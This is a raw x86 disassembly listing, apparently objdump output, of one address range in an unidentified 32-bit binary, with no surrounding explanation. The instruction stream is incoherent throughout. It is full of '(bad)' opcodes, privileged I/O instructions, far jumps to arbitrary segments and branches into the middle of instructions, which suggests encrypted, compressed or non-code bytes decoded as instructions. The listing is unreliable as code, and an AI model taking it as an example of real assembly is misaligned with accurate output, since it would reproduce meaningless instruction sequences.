  4159b5:	(bad)  
  4159b6:	loopne 0x415966
  4159b8:	daa    
  4159b9:	out    0x4c,al
  4159bb:	sti    
  4159bc:	jmp    0x1e96485a
  4159c1:	adc    eax,0x62bafc7
  4159c6:	jnp    0x4159be
  4159c8:	jo     0x415988
  4159ca:	adc    bh,BYTE PTR [ebx]
  4159cc:	add    DWORD PTR [edx+0x76],0x26ad4522
  4159d3:	lds    ecx,FWORD PTR [eax-0x1d]
  4159d6:	shl    bl,0x28
  4159d9:	inc    eax
  4159da:	pop    edi
  4159db:	frstor [edi+0x6ab82f42]
  4159e1:	mov    dl,0xdd
  4159e3:	test   eax,0xc49fa77b
  4159e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159e9:	int    0x5d
  4159eb:	(bad)  
  4159ec:	retf   
  4159ed:	inc    eax
  4159ee:	mov    edi,0x6068bb2b
  4159f3:	test   eax,esp
  4159f5:	cld    
  4159f6:	pop    ds
  4159f7:	sub    dh,bl
  4159f9:	xchg   ebp,eax
  4159fa:	and    esp,DWORD PTR [ecx+0x1749505b]
  415a00:	xchg   eax,esp
  415a02:	test   DWORD PTR [esp+edx*4+0x6443a288],0xd825b250
  415a0d:	adc    eax,0x77263573
  415a12:	out    0xd7,eax
  415a14:	xlat   BYTE PTR ds:[ebx]
  415a15:	popa   
  415a16:	mov    dh,0xe9
  415a18:	aad    0x8
  415a1a:	gs mov ebx,0x1bb3b855
  415a20:	(bad)  
  415a21:	fcmovnb st,st(3)
  415a23:	retf   
  415a24:	fidivr DWORD PTR [ecx+0x1000be9c]
  415a2a:	inc    esi
  415a2b:	cs out 0xb9,al
  415a2e:	jmp    0x4159ff
  415a30:	test   eax,0x395fd3ff
  415a35:	and    al,ch
  415a37:	jns    0x415a6b
  415a39:	lahf   
  415a3a:	shl    edi,cl
  415a3c:	(bad)  
  415a3d:	sub    al,0x19
  415a3f:	lds    ebp,FWORD PTR [ecx-0x662ba21b]
  415a45:	mov    esp,ebx
  415a47:	xchg   edx,eax
  415a48:	inc    ebp
  415a49:	les    esi,FWORD PTR [eax+0xf6d7916]
  415a4f:	test   DWORD PTR [ecx-0x9],eax
  415a52:	mov    BYTE PTR [eax-0x24],bl
  415a55:	mov    ds:0x8303d8e5,eax
  415a5a:	ss loope 0x415a43
  415a5d:	xchg   edi,eax
  415a5e:	cmp    eax,0xaa996001
  415a63:	mov    ah,BYTE PTR ds:0xd0ec2e21
  415a69:	ja     0x415a24
  415a6b:	enter  0xd0b,0xae
  415a6f:	out    dx,eax
  415a70:	jecxz  0x415a08
  415a72:	popa   
  415a73:	repnz es pop esi
  415a76:	rol    ebp,0x55
  415a79:	mov    eax,0x738c5ee9
  415a7e:	xor    ch,BYTE PTR [ebx-0x6b]
  415a81:	cmc    
  415a82:	xor    DWORD PTR [edx+eax*2],0x1050a623
  415a89:	shr    DWORD PTR ds:0xcbd916b4,1
  415a8f:	xor    eax,DWORD PTR [ebx+0x6ab02d52]
  415a95:	mov    edi,esp
  415a97:	fist   DWORD PTR [ebx+0x4e]
  415a9a:	mov    eax,ds:0x4991f7fb
  415a9f:	push   es
  415aa0:	stc    
  415aa1:	mov    ebp,0xe0f4f3cc
  415aa6:	pop    edi
  415aa7:	out    dx,al
  415aa8:	or     edi,ebx
  415aaa:	and    DWORD PTR [ebx+eax*2+0x4c850e38],esi
  415ab1:	jl     0x415b2a
  415ab3:	ret    
  415ab4:	cmp    eax,0xcff26521
  415ab9:	out    0xa4,al
  415abb:	sbb    bh,dh
  415abd:	push   eax
  415abe:	outs   dx,DWORD PTR ds:[esi]
  415abf:	or     DWORD PTR [ecx-0x59],eax
  415ac2:	dec    ecx
  415ac3:	int3   
  415ac4:	pop    ss
  415ac5:	dec    ebx
  415ac6:	out    dx,eax
  415ac7:	in     eax,0xc3
  415ac9:	and    eax,0xaf1d7650
  415ace:	int3   
  415acf:	loope  0x415b40
  415ad1:	add    al,BYTE PTR [esi-0x51480a54]
  415ad7:	out    0x5f,al
  415ad9:	add    edx,ecx
  415adb:	push   0x6f0c9bff
  415ae0:	or     al,ch
  415ae2:	and    BYTE PTR [eax],bl
  415ae4:	jae    0x415a9a
  415ae6:	add    bl,BYTE PTR [ecx]
  415ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae9:	leave  
  415aea:	mov    eax,ds:0xa0cc35d
  415aef:	mov    ?,WORD PTR [ecx]
  415af1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af3:	or     BYTE PTR [ebx+eax*2+0x7d6c657],0x22
  415afb:	and    bh,BYTE PTR [edi-0x1b]
  415afe:	lock lock fisttp WORD PTR [esi+ecx*4+0x2ee37faa]
  415b07:	sub    bh,BYTE PTR gs:[eax+ebp*2-0x61]
  415b0c:	xor    eax,DWORD PTR [eax]
  415b0e:	mov    edx,0x5c84e115
  415b13:	mov    WORD PTR [ebx+0x3bc6f2a7],ds
  415b19:	mov    edx,0x97a84347
  415b1e:	add    ecx,0xffffffa0
  415b21:	pop    ecx
  415b22:	jno    0x415b52
  415b24:	adc    DWORD PTR [esi-0x702b9ddb],ebp
  415b2a:	lock inc eax
  415b2c:	mov    dh,0xd9
  415b2e:	bound  ecx,QWORD PTR [ecx+0x51]
  415b31:	adc    dh,BYTE PTR [esi]
  415b33:	xchg   BYTE PTR [esi+0x32f371ea],dh
  415b39:	add    dh,BYTE PTR [eax+0x3b]
  415b3c:	loope  0x415ba2
  415b3e:	stos   DWORD PTR es:[edi],eax
  415b3f:	mov    edx,0x2dc42a9b
  415b44:	mov    ds:0x1f7d3f24,eax
  415b49:	iret   
  415b4a:	(bad)  
  415b4b:	fadd   QWORD PTR [esi+0x3]
  415b4e:	test   al,0x18
  415b50:	clc    
  415b51:	shl    ch,0x6a
  415b54:	imul   esp,DWORD PTR [esi+0x5f],0x22
  415b58:	addr16 dec ecx
  415b5a:	cmp    ah,BYTE PTR [edi+0x56]
  415b5d:	inc    edi
  415b5e:	adc    BYTE PTR [esi-0x734d3a7a],dl
  415b64:	jge    0x415b3b
  415b66:	add    DWORD PTR [edi+edx*2-0x41],0x37
  415b6b:	js     0x415b1b
  415b6d:	cmp    eax,0xc1ae59c9
  415b72:	sub    al,0xbb
  415b74:	leave  
  415b75:	ins    DWORD PTR es:[edi],dx
  415b76:	mov    dl,0xb
  415b78:	in     eax,0x87
  415b7a:	jg     0x415b65
  415b7c:	sub    al,0xde
  415b7e:	(bad)  
  415b7f:	xlat   BYTE PTR ds:[ebx]
  415b80:	dec    ebx
  415b81:	mov    edx,ebx
  415b83:	stc    
  415b84:	xor    eax,0x25163294
  415b89:	xchg   esi,eax
  415b8a:	test   DWORD PTR [edx+0x54],edx
  415b8d:	or     ebp,DWORD PTR cs:[eax+0x6f]
  415b91:	xor    DWORD PTR [edx],ecx
  415b93:	sar    DWORD PTR [ebx+0x72],1
  415b96:	jbe    0x415baa
  415b98:	or     dh,BYTE PTR [eax]
  415b9a:	jnp    0x415bf6
  415b9c:	xor    al,0xc1
  415b9e:	add    bh,dh
  415ba0:	aam    0xbf
  415ba2:	xor    eax,0x97c7d4db
  415ba7:	push   0xb13869c1
  415bac:	push   cs
  415bad:	sbb    BYTE PTR [edx+0x4655a7f6],bl
  415bb3:	pop    eax
  415bb4:	and    dh,BYTE PTR [ebp+ebx*2-0x69]
  415bb8:	and    DWORD PTR [ebp-0x3e],esi
  415bbb:	stc    
  415bbc:	mov    ax,ds:0x82253782
  415bc2:	test   eax,0xe1e6ab62
  415bc7:	xor    DWORD PTR [ebp+0x6a],eax
  415bca:	les    esp,FWORD PTR [ebp-0x18a25df4]
  415bd0:	push   edx
  415bd1:	xor    al,bh
  415bd3:	mov    eax,ds:0xe390e9fc
  415bd8:	push   edx
  415bd9:	mov    ebx,0x8711c638
  415bde:	dec    ecx
  415bdf:	(bad)  
  415be0:	test   eax,0xb2ac8581
  415be5:	cdq    
  415be6:	and    eax,0xcbbfc4ca
  415beb:	in     eax,dx
  415bec:	retf   0xdeab
  415bef:	push   eax
  415bf0:	add    cl,al
  415bf2:	sbb    BYTE PTR [esi+0x1d],bl
  415bf5:	mov    eax,0x2471f4dc
  415bfa:	mov    ds,esp
  415bfc:	jp     0x415b98
  415bfe:	mov    ds:0x87151da1,al
  415c03:	mov    dl,0x31
  415c05:	imul   esp,DWORD PTR [edi],0xffffff9e
  415c08:	jecxz  0x415c14
  415c0a:	or     al,0x18
  415c0c:	or     bh,BYTE PTR [esi+0x30]
  415c0f:	inc    ebx
  415c10:	nop
  415c11:	jecxz  0x415c29
  415c13:	icebp  
  415c14:	mov    dl,0x88
  415c16:	bound  esi,QWORD PTR [ebp-0x5891d76f]
  415c1c:	inc    edx
  415c1d:	mov    esp,0xac4b0f40
  415c22:	pop    ebp
  415c23:	in     al,dx
  415c24:	jno    0x415bce
  415c26:	imul   esi,DWORD PTR [edi],0xffffffea
  415c29:	(bad)  
  415c2a:	cli    
  415c2b:	repz loope 0x415bf2
  415c2e:	xchg   esp,eax
  415c2f:	dec    ebp
  415c30:	inc    ebp
  415c31:	dec    esp
  415c32:	mov    dh,0x82
  415c34:	push   esp
  415c35:	pop    edx
  415c36:	scas   al,BYTE PTR es:[edi]
  415c37:	xchg   edi,eax
  415c38:	pop    edx
  415c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c3a:	mov    al,ds:0xfb00a681
  415c3f:	mov    WORD PTR [esp+ebp*4],fs
  415c42:	jecxz  0x415c5d
  415c44:	fdivp  st(0),st
  415c46:	shr    DWORD PTR [ebx],cl
  415c48:	jecxz  0x415c5a
  415c4a:	int    0xe6
  415c4c:	idiv   ah
  415c4e:	or     BYTE PTR [ecx-0x4b15be2f],bh
  415c54:	outs   dx,BYTE PTR ds:[esi]
  415c55:	sub    DWORD PTR [edi],esp
  415c57:	cs pop ebp
  415c59:	aaa    
  415c5a:	sub    ebx,DWORD PTR ds:0x5f2798f8
  415c60:	jbe    0x415bf1
  415c62:	inc    esp
  415c63:	push   ds
  415c64:	stc    
  415c65:	or     eax,0xb05259bf
  415c6a:	je     0x415c5c
  415c6c:	push   ecx
  415c6d:	sti    
  415c6e:	ficom  DWORD PTR [esi+0x544970d6]
  415c74:	pop    edx
  415c75:	and    bl,BYTE PTR [esi+eiz*8-0x9]
  415c79:	aaa    
  415c7a:	outs   dx,DWORD PTR ds:[esi]
  415c7b:	dec    ebp
  415c7c:	jbe    0x415c06
  415c7e:	(bad)  
  415c7f:	cli    
  415c80:	or     eax,0x8a2503f0
  415c85:	mov    ebx,0xac149000
  415c8a:	out    dx,eax
  415c8b:	aaa    
  415c8c:	and    eax,0x14af93f1
  415c91:	sbb    DWORD PTR [eax-0x11],ecx
  415c94:	inc    edi
  415c95:	call   0x8b76:0x80ebcd39
  415c9c:	in     eax,dx
  415c9d:	fs push ebx
  415c9f:	sub    ah,BYTE PTR [ebx]
  415ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca2:	in     al,0xac
  415ca4:	dec    esi
  415ca5:	mov    al,ds:0x10eb7e65
  415caa:	xor    esp,DWORD PTR [ebx]
  415cac:	jmp    0xa900:0x738ac2f0
  415cb3:	xor    ah,dh
  415cb5:	ds add al,0xde
  415cb9:	adc    BYTE PTR [ecx],bh
  415cbb:	inc    ecx
  415cbc:	push   cs
  415cbd:	or     al,0x79
  415cbf:	stos   DWORD PTR es:[edi],eax
  415cc0:	outs   dx,BYTE PTR ds:[esi]
  415cc1:	mov    ecx,0x72aac2b7
  415cc6:	mov    edi,0xc7664175
  415ccb:	in     al,0x12
  415ccd:	ins    DWORD PTR es:[edi],dx
  415cce:	cdq    
  415ccf:	pop    edx
  415cd0:	lods   eax,DWORD PTR ds:[esi]
  415cd1:	enter  0x6d5f,0x3d
  415cd5:	inc    edx
  415cd6:	cdq    
  415cd7:	push   es
  415cd8:	jl     0x415d27
  415cda:	jmp    0x415ce2
  415cdc:	mov    ah,0x28
  415cde:	dec    ecx
  415cdf:	adc    BYTE PTR ds:0xd84b40f9,0x14
  415ce6:	sub    DWORD PTR [ebx],esp
  415ce8:	loop   0x415d2a
  415cea:	and    BYTE PTR [ebp-0x31],0x3b
  415cee:	scas   eax,DWORD PTR es:[edi]
  415cef:	jecxz  0x415c97
  415cf1:	xlat   BYTE PTR ds:[ebx]
  415cf2:	mov    WORD PTR [ebp*8-0x7a6e3ec0],ds
  415cf9:	push   edx
  415cfa:	fidiv  WORD PTR [esi-0x308a6484]
  415d00:	sbb    al,BYTE PTR [ebp+0x53]
  415d03:	data16 lods al,BYTE PTR ds:[esi]
  415d05:	lock and BYTE PTR ss:[edi+ebx*4+0x67],cl
  415d0b:	dec    ebx
  415d0c:	pop    ebx
  415d0d:	dec    edx
  415d0e:	or     ebp,ebp
  415d10:	mov    ebx,eax
  415d12:	cli    
  415d13:	cmp    eax,esp
  415d15:	(bad)  
  415d16:	clc    
  415d17:	or     BYTE PTR [ecx],dh
  415d19:	scas   eax,DWORD PTR es:[edi]
  415d1a:	xchg   edi,eax
  415d1b:	pop    edx
  415d1c:	mov    edx,0x6c4c600a
  415d21:	mov    ebx,0x3b9cef42
  415d26:	mov    DWORD PTR [ecx],eax
  415d28:	push   esi
  415d29:	shr    BYTE PTR [esi-0x4d35a3ec],1
  415d2f:	jb     0x415cf8
  415d31:	xchg   esp,eax
  415d32:	mov    dh,0x14
  415d34:	scas   al,BYTE PTR es:[edi]
  415d35:	xor    al,0xff
  415d37:	les    edi,FWORD PTR [eax-0x1865e653]
  415d3d:	cmp    edi,esp
  415d3f:	loopne 0x415db5
  415d41:	pop    ds
  415d42:	or     BYTE PTR [edx-0x7b315859],0xa2
  415d49:	push   eax
  415d4a:	out    0xaf,eax
  415d4c:	rcr    ebx,0x59
  415d4f:	and    eax,0xb62bb816
  415d54:	cmp    BYTE PTR [edi-0x68],bl
  415d57:	test   BYTE PTR [ecx*8-0x60976de5],ah
  415d5e:	jmp    0x4398:0x3939afb8
  415d65:	push   0x73
  415d67:	and    al,0x72
  415d69:	cmovo  ebp,ebx
  415d6c:	mov    dl,0x9
  415d6e:	ja     0x415d4b
  415d70:	sti    
  415d71:	pop    ss
  415d72:	pop    esp
  415d73:	shl    BYTE PTR [ebx-0x2c],cl
  415d76:	popa   
  415d77:	fadd   st,st(1)
  415d79:	jmp    0x5116:0x4e1faeeb
  415d80:	repnz adc dl,BYTE PTR [ebp-0x31ba22dc]
  415d87:	outs   dx,DWORD PTR ds:[esi]
  415d88:	fwait
  415d89:	in     al,dx
  415d8a:	fsubrp st(3),st
  415d8c:	pop    esi
  415d8d:	pop    esi
  415d8e:	mov    DWORD PTR [eax+0x2e],ecx
  415d91:	add    edx,DWORD PTR [edi]
  415d93:	repnz pop ds
  415d95:	retf   0xf138
  415d98:	xchg   ebp,eax
  415d99:	mov    edx,0x13265208
  415d9e:	jle    0x415d30
  415da0:	dec    edx
  415da1:	ins    BYTE PTR es:[edi],dx
  415da2:	adc    dh,BYTE PTR [esp+ebp*8]
  415da5:	outs   dx,BYTE PTR ds:[esi]
  415da6:	jno    0x415df1
  415da8:	jb     0x415dd7
  415daa:	inc    edx
  415dab:	adc    eax,DWORD PTR [esi+0x6e]
  415dae:	(bad)  
  415daf:	aad    0xc7
  415db1:	pop    ss
  415db2:	push   edx
  415db3:	out    dx,eax
  415db4:	pop    edi
  415db5:	add    BYTE PTR [ebx+0x732915c8],al
  415dbb:	xlat   BYTE PTR ds:[ebx]
  415dbc:	mov    edx,0xb4c94bd4
  415dc1:	dec    ebx
  415dc2:	push   esi
  415dc3:	dec    esp
  415dc4:	neg    DWORD PTR ss:[edi+esi*2-0x6b]
  415dc9:	xchg   ecx,eax
  415dca:	dec    edx
  415dcb:	ins    DWORD PTR es:[edi],dx
  415dcc:	ficomp WORD PTR [ecx]
  415dce:	out    0x6a,al
  415dd0:	dec    ebp
  415dd1:	xor    ebp,DWORD PTR [ecx+0x57]
  415dd4:	pop    edi
  415dd5:	in     al,dx
  415dd6:	pop    ss
  415dd7:	jbe    0x415db7
  415dd9:	ss in  al,dx
  415ddb:	mov    WORD PTR es:[ebx],ds
  415dde:	adc    ch,BYTE PTR [edi-0x4e]
  415de1:	pop    esp
  415de2:	add    BYTE PTR [esi+0x26],0x34
  415de6:	adc    BYTE PTR [eax],0x7b
  415de9:	out    dx,eax
  415dea:	inc    edi
  415deb:	loopne 0x415df2
  415ded:	cmp    al,0xd5
  415def:	inc    ecx
  415df0:	ins    BYTE PTR es:[edi],dx
  415df1:	mov    bl,0x51
  415df3:	and    bh,cl
  415df5:	loop   0x415e43
  415df7:	or     al,0x43
  415df9:	bound  ecx,QWORD PTR [ebx+0x59eeb58a]
  415dff:	push   0x17
  415e01:	xchg   esp,eax
  415e02:	cdq    
  415e03:	adc    DWORD PTR [edx],eax
  415e05:	aaa    
  415e06:	rol    DWORD PTR [ebx-0xb43b272],cl
  415e0c:	xlat   BYTE PTR ds:[ebx]
  415e0d:	cwde   
  415e0e:	pop    ebp
  415e0f:	cmp    bl,cl
  415e11:	jmp    0x415dca
  415e13:	ret    0xcdbe
  415e16:	xlat   BYTE PTR ds:[ebx]
  415e17:	mov    esi,ebx
  415e19:	in     eax,0x90
  415e1b:	pop    esi
  415e1c:	and    eax,0x2fe011df
  415e21:	jno    0x415e92
  415e23:	or     BYTE PTR [edx-0x4],ch
  415e26:	in     al,0xf7
  415e28:	jmp    0x98cc224f
  415e2d:	lds    edx,FWORD PTR [ebx+0x7e]
  415e30:	cli    
  415e31:	addr16 jb 0x415ddc
  415e34:	push   esi
  415e35:	add    esi,DWORD PTR [eax]
  415e37:	pushf  
  415e38:	mov    es,WORD PTR cs:[ebx-0x1ede3ba2]
  415e3f:	push   edi
  415e40:	addr16 push eax
  415e42:	or     esp,DWORD PTR [eax+0x4a396ec3]
  415e48:	std    
  415e49:	stc    
  415e4a:	loopne 0x415e97
  415e4c:	push   ds
  415e4d:	mov    bl,0xb
  415e4f:	mov    esp,0xb30bc3df
  415e54:	lahf   
  415e55:	push   esi
  415e56:	(bad)  
  415e57:	adc    al,BYTE PTR [ecx+ebp*1]
  415e5a:	out    0x18,eax
  415e5c:	mov    eax,ss
  415e5e:	xor    ecx,edi
  415e60:	push   edx
  415e61:	push   ebp
  415e62:	xor    eax,0xe0db7b2a
  415e67:	jg     0x415e4d
  415e69:	mov    DWORD PTR [edx-0x215f2b11],edx
  415e6f:	lds    eax,FWORD PTR [ebx+0x5cedbd8e]
  415e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e76:	xor    al,0x8a
  415e78:	push   edi
  415e79:	test   al,0x0
  415e7b:	cmp    cl,BYTE PTR [eax-0x1f]
  415e7e:	mov    dl,0x79
  415e80:	jl     0x415ed0
  415e82:	or     esi,eax
  415e84:	or     DWORD PTR [ebp-0x67],ecx
  415e87:	xor    al,0xbb
  415e89:	push   es
  415e8a:	pop    ecx
  415e8b:	out    0x88,eax
  415e8d:	repnz add ebp,DWORD PTR [ebx]
  415e90:	pop    ebx
  415e91:	inc    ebp
  415e92:	pusha  
  415e93:	and    BYTE PTR [ebp-0x7584cba8],al
  415e99:	ds cdq 
  415e9b:	xor    dh,BYTE PTR [esi]
  415e9d:	mov    cl,0xbe
  415e9f:	jo     0x415e6c
  415ea1:	pop    edi
  415ea2:	(bad)  
  415ea3:	and    eax,0xb31a6fab
  415ea8:	in     al,dx
  415ea9:	shl    DWORD PTR [esi],0x9f
  415eac:	cmc    
  415ead:	jecxz  0x415e56
  415eaf:	test   dl,dl
  415eb1:	outs   dx,DWORD PTR ds:[esi]
  415eb2:	or     eax,0x9f3c03ad
  415eb7:	pop    esi
  415eb8:	ds aaa 
  415eba:	ins    DWORD PTR es:[edi],dx
  415ebb:	add    esp,DWORD PTR [ecx+0x3f]
  415ebe:	js     0x415e76
  415ec0:	loop   0x415e65
  415ec2:	push   ds
  415ec3:	(bad)  
  415ec4:	out    0x76,al
  415ec6:	ror    DWORD PTR [edx],0xda
  415ec9:	popf   
  415eca:	ficom  WORD PTR [ecx+esi*1-0x36fd2f4b]
  415ed1:	jmp    0x4e118f55
  415ed6:	mov    ds:0x323fa30a,al
  415edb:	push   cs
  415edc:	(bad)  
  415edd:	outs   dx,BYTE PTR ds:[esi]
  415ede:	xchg   ebx,eax
  415edf:	daa    
  415ee0:	lods   eax,DWORD PTR ds:[esi]
  415ee1:	and    ebp,DWORD PTR [eax]
  415ee3:	xchg   ecx,eax
  415ee4:	nop
  415ee5:	ror    ch,1
  415ee7:	ss jle 0x415ecd
  415eea:	aas    
  415eeb:	mov    ds,WORD PTR [ebx]
  415eed:	xor    edi,eax
  415eef:	mov    DWORD PTR [edi-0x31efda5d],edi
  415ef5:	jge    0x415ebd
  415ef7:	sbb    BYTE PTR [ebp-0x319fab3f],bl
  415efd:	fbstp  TBYTE PTR [ebx+0xfdc471a]
  415f03:	cmp    BYTE PTR [ecx],al
  415f05:	jb     0x415ef3
  415f07:	es arpl sp,cx
  415f0a:	xor    al,0xae
  415f0c:	jb     0x415f3b
  415f0e:	stc    
  415f0f:	jb     0x415f53
  415f11:	leave  
  415f12:	adc    DWORD PTR [edx+ebx*2+0x30c1e6a],edi
  415f19:	daa    
  415f1a:	jnp    0x415efb
  415f1c:	out    dx,eax
  415f1d:	xor    ecx,DWORD PTR [edi]
  415f1f:	sahf   
  415f20:	shl    BYTE PTR [edi+0x65],1
  415f23:	inc    esp
  415f24:	gs sbb al,0xbe
  415f27:	stos   DWORD PTR es:[edi],eax
  415f28:	push   ds
  415f29:	push   ebx
  415f2a:	pop    ds
  415f2b:	xchg   esi,eax
  415f2c:	dec    ebx
  415f2d:	stos   BYTE PTR es:[edi],al
  415f2e:	jecxz  0x415f48
  415f30:	(bad)  [edi-0x80]
  415f33:	adc    DWORD PTR [ebp+ecx*1+0x7a4db377],esi
  415f3a:	push   esi
  415f3b:	ja     0x415ee0
  415f3d:	stos   BYTE PTR es:[edi],al
  415f3e:	pop    esp
  415f3f:	xchg   ebp,eax
  415f40:	daa    
  415f41:	leave  
  415f42:	leave  
  415f43:	mov    eax,0x6efd48b7
  415f48:	fistp  QWORD PTR [edx+0x75]
  415f4b:	sti    
  415f4c:	pop    ebp
  415f4d:	fcomip st,st(5)
  415f4f:	push   eax
  415f50:	std    
  415f51:	outs   dx,DWORD PTR ds:[esi]
  415f52:	pop    eax
  415f53:	sub    al,0x4a
  415f55:	les    ebp,FWORD PTR [ebp+0x64a1417b]
  415f5b:	push   ebx
  415f5c:	popf   
  415f5d:	sub    eax,0x9324fd32
  415f62:	mov    bl,0x46
  415f64:	hlt    
  415f65:	ja     0x415fd2
  415f67:	jb     0x415f1e
  415f69:	or     BYTE PTR [eax+0x3d],bh
  415f6c:	xchg   edi,eax
  415f6d:	xchg   ebx,eax
  415f6e:	lea    esp,ds:0x20796f64
  415f74:	cmp    eax,esp
  415f76:	ds mov edx,0x47a26051
  415f7c:	pop    ds
  415f7d:	sahf   
  415f7e:	or     esp,ebx
  415f80:	pop    eax
  415f81:	xchg   ah,al
  415f83:	psraw  mm2,QWORD PTR [ebx+0x4]
  415f87:	hlt    
  415f88:	scas   eax,DWORD PTR es:[edi]
  415f89:	sub    bl,cl
  415f8b:	mov    esi,0xc185fcd5
  415f90:	adc    ebp,eax
  415f92:	adc    DWORD PTR [ebx-0x4a],edx
  415f95:	test   al,0x78
  415f97:	in     al,0x40
  415f99:	jo     0x415fdd
  415f9b:	stos   BYTE PTR es:[edi],al
  415f9c:	mov    cl,0x6
  415f9e:	xor    dl,BYTE PTR [ebx]
  415fa0:	mov    ch,0xa4
  415fa2:	out    dx,al
  415fa3:	xchg   ecx,eax
  415fa4:	fld    st(0)
  415fa6:	or     BYTE PTR ds:0x19db587e,0x4b
  415fad:	xchg   ebp,edx
  415faf:	aas    
  415fb0:	test   ch,dh
  415fb2:	or     ebx,0xa64887e0
  415fb8:	dec    esp
  415fb9:	and    eax,0x275fe0f4
  415fbe:	(bad)  
  415fbf:	sti    
  415fc0:	inc    ecx
  415fc1:	(bad)  
  415fc2:	test   eax,0xf1c6fab0
  415fc7:	mov    cl,bh
  415fc9:	or     BYTE PTR fs:[edi],ch
  415fcc:	shl    bh,1
  415fce:	daa    
  415fcf:	push   edx
  415fd0:	jb     0x415f67
  415fd2:	int    0xe6
  415fd4:	xor    BYTE PTR [ebx+0x85a00b2],bh
  415fda:	or     al,dl
  415fdc:	les    esi,FWORD PTR [esi+eax*8-0x7eb35276]
  415fe3:	sbb    BYTE PTR [eax+0x7],0xf9
  415fe7:	mov    dh,0x36
  415fe9:	jmp    esi
  415feb:	mov    edx,0xb97245a0
  415ff0:	jns    0x416006
  415ff2:	mov    edi,0x16771c6c
  415ff7:	push   edi
  415ff8:	jno    0x416000
  415ffa:	test   BYTE PTR [edx-0xf2be360],al
  416000:	sub    al,0xd1
  416002:	loopne 0x41602e
  416004:	lods   eax,DWORD PTR ds:[esi]
  416005:	cmp    dh,bh
  416007:	pop    esi
  416008:	sub    al,BYTE PTR [esi-0x65219d4f]
  41600e:	sub    edi,DWORD PTR [edi-0x76cf441e]
  416014:	cdq    
  416015:	dec    esp
  416016:	cdq    
  416017:	mov    ebp,0x610fee
  41601c:	adc    eax,0x971910e
  416021:	inc    esp
  416022:	xchg   esp,eax
  416023:	jbe    0x4160a1
  416025:	das    
  416026:	enter  0xedf5,0x97
  41602a:	ret    0xe98a
  41602d:	gs pop edx
  41602f:	sbb    al,0x12
  416031:	(bad)  
  416032:	jno    0x415fbe
  416034:	or     DWORD PTR [ecx+0x4ab417a3],0x9f591fbb
  41603e:	add    al,0xd3
  416040:	cdq    
  416041:	lea    esp,ds:0x3da5d741
  416047:	mov    eax,0xceaca01d
  41604c:	inc    ecx
  41604d:	repnz fsub st(1),st
  416050:	les    esp,FWORD PTR [ebp+0x1d]
  416053:	cmp    bh,BYTE PTR [edx]
  416055:	mov    ah,0xfa
  416057:	rcr    dh,1
  416059:	push   ebx
  41605a:	sub    edi,DWORD PTR [ebx]
  41605c:	push   edx
  41605d:	std    
  41605e:	mov    dl,0xed
  416060:	out    0xe9,al
  416062:	dec    ecx
  416063:	jo     0x41606a
  416065:	es sahf 
  416067:	das    
  416068:	mov    ebp,0xa7d389aa
  41606d:	int    0x30
  41606f:	xchg   ebx,eax
  416070:	push   ss
  416071:	add    ecx,ebp
  416073:	outs   dx,DWORD PTR ds:[esi]
  416074:	pushf  
  416075:	inc    esi
  416076:	pop    edi
  416077:	daa    
  416078:	push   es
  416079:	(bad)  
  41607a:	fnstcw WORD PTR [ecx]
  41607c:	rol    DWORD PTR [ebp-0x3ce4e747],1
  416082:	aaa    
  416083:	loopne 0x4160c1
  416085:	sub    al,0x5c
  416087:	mov    DWORD PTR [ebx],ebx
  416089:	mov    edx,0x134940d5
  41608e:	rcr    DWORD PTR [ebp+0x21],0x23
  416092:	sub    eax,0x34966fb5
  416097:	xchg   ebx,eax
  416098:	xor    bl,BYTE PTR [ebp-0x3f8ad3ce]
  41609e:	lock arpl WORD PTR [esi],sp
  4160a1:	mov    ds:0xa2442a57,al
  4160a6:	lock mov eax,0x7e855584
  4160ac:	and    BYTE PTR [esp+ecx*8+0x1d],ah
  4160b0:	sub    eax,0xcffe1b83
  4160b5:	lea    edi,[ebp+0xe3850f4]
  4160bb:	lods   eax,DWORD PTR ds:[esi]
  4160bc:	in     eax,dx
  4160bd:	mov    esp,0x2c194be3
  4160c2:	sahf   
  4160c3:	stc    
  4160c4:	mov    ebx,0xdcec3329
  4160c9:	hlt    
  4160ca:	mov    ch,0x5f
  4160cc:	scas   eax,DWORD PTR es:[edi]
  4160cd:	inc    esp
  4160ce:	jmp    0xb7ff4719
  4160d3:	je     0x416132
  4160d5:	pop    edi
  4160d6:	aas    
  4160d7:	or     BYTE PTR [eax+0x66972653],bh
  4160dd:	sbb    eax,0x10b2222f
  4160e2:	aad    0xb9
  4160e4:	out    0xc9,eax
  4160e6:	mov    dh,BYTE PTR [eax-0x20]
  4160e9:	cli    
  4160ea:	dec    eax
  4160eb:	call   0x36d28e17
  4160f0:	xchg   edi,eax
  4160f1:	mov    esp,0x81472339
  4160f6:	adc    al,0x84
  4160f8:	shr    edx,cl
  4160fa:	adc    al,0x69
  4160fc:	cmp    al,0x4
  4160fe:	dec    ebx
  4160ff:	mov    BYTE PTR [ebx+eax*1-0x52b2c3bb],bl
  416106:	data16 mov al,0x77
  416109:	mov    al,0xf7
  41610b:	mov    WORD PTR [edx+eiz*4-0x35],fs
  41610f:	push   eax
  416110:	lock inc eax
  416112:	loop   0x41612d
  416114:	jno    0x416159
  416116:	(bad)  
  416117:	loop   0x416194
  416119:	ret    
  41611a:	pop    ds
  41611b:	cmp    BYTE PTR [ebx+0x757d82f9],dh
  416121:	arpl   WORD PTR [eax+0x3a4a9ca3],di
  416127:	sbb    BYTE PTR [ecx+0x78],0x18
  41612b:	push   ecx
  41612c:	pop    ebx
  41612d:	jno    0x4160e7
  41612f:	out    dx,eax
  416130:	loope  0x4160d9
  416132:	aad    0xcc
  416134:	adc    DWORD PTR [ebx],edi
  416136:	leave  
  416137:	pop    ebx
  416138:	xchg   esp,eax
  416139:	in     al,dx
  41613a:	and    ecx,DWORD PTR [ecx-0x690be886]
  416140:	shl    DWORD PTR [eax+0x644ddea4],cl
  416146:	mov    dl,0x32
  416148:	lea    ebx,[eax+0x5d]
  41614b:	loop   0x416182
  41614d:	fimul  DWORD PTR [ebx-0x52]
  416150:	pop    ds
  416151:	aad    0x19
  416153:	rcr    DWORD PTR [edi+0x59],cl
  416156:	ret    
  416157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416158:	xchg   bl,dh
  41615a:	and    DWORD PTR [esi-0x46],edi
